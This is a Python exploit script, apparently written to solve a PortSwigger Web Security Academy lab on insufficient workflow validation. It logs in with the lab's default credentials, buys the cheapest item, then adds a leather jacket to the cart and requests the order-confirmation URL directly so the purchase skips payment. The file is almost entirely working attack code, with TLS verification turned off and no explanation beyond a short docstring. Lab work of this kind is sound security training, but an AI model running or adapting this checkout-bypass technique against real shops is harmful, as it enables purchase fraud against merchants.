"""
Exploit for lab:
    Insufficient workflow validation
    https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation

By Xqweak.

---
Description:
    This lab makes flawed assumptions about the sequence of events in the
    purchasing workflow. To solve the lab, exploit this flaw to buy a
    "Lightweight l33t leather jacket".
"""
import requests
from tqdm import tqdm
import argparse
from bs4 import BeautifulSoup
import warnings
from selenium import webdriver
from time import sleep
import numpy as np
warnings.filterwarnings("ignore")



class LogicExploit:
    def __init__(self, url):
        self.url = url

    def login(self):
        s = requests.Session()
        s.verify = False
        login_url = f'{self.url}/login'
        print(f'loggin in {login_url}')
        c = s.get(login_url).content
        csrf_token = BeautifulSoup(c, 'lxml').find('input', {"name":"csrf"})['value']
        login_data = {
                "username":'wiener',
                "password":"peter",
                "csrf":csrf_token
                }
        s.post(login_url, login_data)
        print('logued!')
        return s , s.cookies['session']

    def find_cheapest_item(self):
        print('finding min price...')
        items_url = [f'{self.url}/product?productId={i}' for i in range(1,21)]
        # Grab minimum prices
        prices = [int(BeautifulSoup(requests.get(i,verify=False).content,
                  'lxml').find('div',{"id":"price"}).text.replace('$','').split('.')[0])
                  for i in tqdm(items_url) ]
        less_price = np.argmin(prices)
        print(f'the item with mimimum price is item with id is: {less_price + 1}')
        return less_price + 1


    def purchase_l33t_jacket(self):
        s, s_cookie = self.login()
        cart_url = f'{self.url}/cart'
        min_price_item = self.find_cheapest_item()
        # Purchase item
        cheap_item_data = {
                "productId":min_price_item,
                "quantity":1,
                "redir":"CART"
                }
        c = s.post(cart_url, cheap_item_data)
        csrf_token = BeautifulSoup(c.content, 'lxml').find('input',{"name":"csrf"})['value']
        csrf_data = {"csrf":csrf_token}
        s.post(f'{self.url}/cart/checkout', csrf_data)
        # Purchase l33tjacket
        l33t_jacket_data = {
                "productId":1,
                "quantity":1,
                "redir":"CART"
                }
        c = s.post(cart_url, l33t_jacket_data)
        csrf_token = BeautifulSoup(c.content, 'lxml').find('input',{"name":"csrf"})['value']
        s.get(f'{self.url}/cart/order-confirmation?order-confirmed=true')
        print('L33t jacket purchased!!!')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, required=True, help="Portswigger's academy url lab")
    args = parser.parse_args()
    lab = LogicExploit(args.url)
    lab.purchase_l33t_jacket()
